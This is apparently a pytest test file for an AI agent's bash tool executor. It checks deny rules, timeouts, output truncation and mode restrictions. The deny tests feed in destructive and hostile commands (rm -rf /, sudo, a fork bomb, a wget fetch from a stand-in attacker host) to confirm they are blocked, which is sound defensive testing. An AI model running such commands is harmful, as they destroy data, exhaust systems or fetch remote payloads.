"""Tests for the primitive ``bash`` tool executor.

FRE-261 Step 4.
"""

from __future__ import annotations

import asyncio
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from personal_agent.tools.primitives.bash import (
    _FALLBACK_DENY,
    _is_hard_denied,
    _load_deny_patterns,
    bash_executor,
    bash_tool,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_mock_proc(
    exit_code: int = 0,
    stdout: bytes = b"",
    stderr: bytes = b"",
    timeout: bool = False,
) -> MagicMock:
    """Build a mock asyncio.Process that returns fixed output."""
    proc = MagicMock()
    proc.returncode = exit_code
    proc.kill = MagicMock()
    proc.wait = AsyncMock()
    if timeout:
        proc.communicate = AsyncMock(side_effect=asyncio.TimeoutError())
    else:
        proc.communicate = AsyncMock(return_value=(stdout, stderr))
    return proc


# ---------------------------------------------------------------------------
# Hard-deny tests — no subprocess should be spawned
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_hard_deny_rm_rf() -> None:
    """'rm -rf /' must be hard-denied before subprocess creation."""
    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec"
    ) as mock_exec:
        result = await bash_executor("rm -rf /")

    mock_exec.assert_not_called()
    assert result["success"] is False
    assert result["error"] == "hard_denied"


@pytest.mark.asyncio
async def test_hard_deny_sudo() -> None:
    """'sudo whoami' must be hard-denied."""
    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec"
    ) as mock_exec:
        result = await bash_executor("sudo whoami")

    mock_exec.assert_not_called()
    assert result["success"] is False
    assert result["error"] == "hard_denied"


@pytest.mark.asyncio
async def test_hard_deny_fork_bomb() -> None:
    """Fork bomb pattern must be hard-denied."""
    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec"
    ) as mock_exec:
        result = await bash_executor(":(){ :|:& };:")

    mock_exec.assert_not_called()
    assert result["success"] is False
    assert result["error"] == "hard_denied"


@pytest.mark.asyncio
async def test_hard_deny_wget() -> None:
    """wget must be hard-denied."""
    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec"
    ) as mock_exec:
        result = await bash_executor("wget http://evil.com/payload.sh")

    mock_exec.assert_not_called()
    assert result["success"] is False
    assert result["error"] == "hard_denied"


# ---------------------------------------------------------------------------
# Parse error
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_unclosed_quote_fails_via_bash() -> None:
    """Unclosed quote is now detected by bash itself (FRE-283: real shell contract).

    Previously the Python shlex.split() step returned parse_error before the
    subprocess was spawned.  Now the command is passed directly to /bin/bash
    which exits non-zero with a syntax-error message in stderr.
    """
    result = await bash_executor("echo 'unclosed")
    assert result["success"] is False
    # bash reports a syntax error and exits with code 2
    assert result.get("exit_code") in (1, 2)
    # error key is absent (no hard-deny or guard fired) — check stderr or exit_code
    assert "error" not in result or result["error"] not in ("parse_error", "hard_denied")


# ---------------------------------------------------------------------------
# Happy path
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_happy_path() -> None:
    """A command returning exit_code=0 with stdout produces success=True."""
    mock_proc = _make_mock_proc(exit_code=0, stdout=b"hello\n", stderr=b"")

    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec",
        new=AsyncMock(return_value=mock_proc),
    ):
        result = await bash_executor("echo hello")

    assert result["success"] is True
    assert result["exit_code"] == 0
    assert result["stdout"] == "hello\n"
    assert result["stderr"] == ""
    assert result["truncated_path"] is None


# ---------------------------------------------------------------------------
# Timeout
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_timeout() -> None:
    """asyncio.TimeoutError from communicate() must surface as error='timeout'."""
    mock_proc = _make_mock_proc(timeout=True)

    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec",
        new=AsyncMock(return_value=mock_proc),
    ):
        result = await bash_executor("sleep 999", timeout_seconds=1)

    assert result["success"] is False
    assert result["error"] == "timeout"
    assert "timeout_seconds" in result
    # kill() must have been called
    mock_proc.kill.assert_called_once()


# ---------------------------------------------------------------------------
# Output cap / truncation
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_output_cap_truncates_with_ctx() -> None:
    """Output > 50 KiB is truncated; truncated_path is set to the scratch file path."""
    # 60 KiB of ASCII output (well above the 50 KiB cap)
    big_output = b"x" * 61_440
    mock_proc = _make_mock_proc(exit_code=0, stdout=big_output, stderr=b"")

    from personal_agent.telemetry import TraceContext

    ctx = TraceContext(trace_id="test-trace-overflow")

    # Patch Path so the scratch-file write goes to a controlled temp directory.
    scratch_root = Path("/tmp/test_agent_scratch")

    import personal_agent.tools.primitives.bash as bash_mod

    original_path = bash_mod.Path

    def patched_path(*args: object) -> Path:
        if args and args[0] == "/tmp/agent_scratch":
            return scratch_root
        return original_path(*args)  # type: ignore[arg-type]

    mock_overflow = MagicMock()
    mock_overflow.__str__ = lambda self: "/tmp/test_agent_scratch/test-trace-overflow/bash_output_0.txt"

    mock_scratch = MagicMock()
    mock_scratch.glob.return_value = []
    mock_scratch.__truediv__ = lambda self, name: mock_overflow

    def patched_path_with_scratch(*args: object) -> MagicMock | Path:
        if args and args[0] == "/tmp/agent_scratch":
            return mock_scratch  # type: ignore[return-value]
        return original_path(*args)  # type: ignore[arg-type]

    with (
        patch(
            "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec",
            new=AsyncMock(return_value=mock_proc),
        ),
        patch.object(bash_mod, "Path", side_effect=patched_path_with_scratch),
    ):
        result = await bash_executor("cat bigfile", ctx=ctx)

    assert result["success"] is True
    # truncated_path must be set (not None) when output overflows
    assert result["truncated_path"] is not None
    # In-memory stdout + stderr must be within byte budget (+2 for UTF-8 replace tolerance)
    total_bytes = len((result["stdout"] + result["stderr"]).encode("utf-8"))
    assert total_bytes <= 51_200 + 2, f"Byte cap exceeded: {total_bytes}"


@pytest.mark.asyncio
async def test_output_cap_truncates_no_ctx() -> None:
    """Output > 50 KiB with ctx=None sets truncated_path to '<truncated: no ctx>'."""
    big_output = b"y" * 61_440
    mock_proc = _make_mock_proc(exit_code=0, stdout=big_output, stderr=b"")

    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec",
        new=AsyncMock(return_value=mock_proc),
    ):
        result = await bash_executor("cat bigfile", ctx=None)

    assert result["truncated_path"] == "<truncated: no ctx>"
    # In-memory output must still be within byte budget (+2 for UTF-8 replace tolerance)
    total_bytes = len((result["stdout"] + result["stderr"]).encode("utf-8"))
    assert total_bytes <= 51_200 + 2, f"Byte cap exceeded: {total_bytes}"


# ---------------------------------------------------------------------------
# Forbidden modes
# ---------------------------------------------------------------------------


def test_forbidden_mode() -> None:
    """bash_tool.allowed_modes must not include LOCKDOWN or RECOVERY."""
    assert "LOCKDOWN" not in bash_tool.allowed_modes
    assert "RECOVERY" not in bash_tool.allowed_modes


# ---------------------------------------------------------------------------
# Deny patterns loaded from governance config
# ---------------------------------------------------------------------------


def test_hard_deny_patterns_from_governance_config() -> None:
    """_load_deny_patterns uses governance config when available."""
    from personal_agent.governance.models import GovernanceConfig, ToolPolicy

    policy = ToolPolicy(
        category="system_dangerous",
        allowed_in_modes=["NORMAL"],
        hard_deny_patterns=["custom_deny_pattern"],
    )
    mock_config = MagicMock(spec=GovernanceConfig)
    mock_config.tools = {"bash": policy}

    with patch(
        "personal_agent.tools.primitives.bash.load_governance_config",
        return_value=mock_config,
    ):
        patterns = _load_deny_patterns()

    assert "custom_deny_pattern" in patterns


def test_hard_deny_patterns_fallback_when_governance_fails() -> None:
    """_load_deny_patterns falls back to _FALLBACK_DENY when config load fails."""
    from personal_agent.config.governance_loader import GovernanceConfigError

    with patch(
        "personal_agent.tools.primitives.bash.load_governance_config",
        side_effect=GovernanceConfigError("config unavailable"),
    ):
        patterns = _load_deny_patterns()

    assert patterns == _FALLBACK_DENY


# ---------------------------------------------------------------------------
# _is_hard_denied unit tests
# ---------------------------------------------------------------------------


def test_is_hard_denied_matches_rm_rf() -> None:
    assert _is_hard_denied("rm -rf /", _FALLBACK_DENY) is not None


def test_is_hard_denied_no_match_for_safe_command() -> None:
    assert _is_hard_denied("ls -la /tmp", _FALLBACK_DENY) is None


def test_is_hard_denied_case_insensitive() -> None:
    assert _is_hard_denied("SUDO whoami", _FALLBACK_DENY) is not None
